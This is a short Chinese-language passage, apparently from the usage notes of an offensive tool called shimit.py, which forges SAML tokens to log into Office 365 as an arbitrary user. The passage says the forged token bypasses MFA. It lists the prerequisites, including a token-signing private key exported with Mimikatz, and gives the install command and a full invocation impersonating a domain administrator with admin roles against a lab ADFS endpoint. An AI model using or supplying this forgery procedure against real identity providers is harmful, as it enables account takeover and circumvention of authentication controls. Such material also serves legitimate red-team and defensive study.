	使用提取的信息，该工具将生成一个伪造的 SAML 令牌作为任意用户，然后可用于在不知道该用户密码的情况下对 Office 365 进行身份验证。此攻击还绕过任何 MFA 要求
	要求：

	令牌签名私钥（使用 Mimikatz 从个人商店导出）
	IdP 公共证书
	IdP 名称
	角色名称（要承担的角色）
	>python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml
	>python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file
	-u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012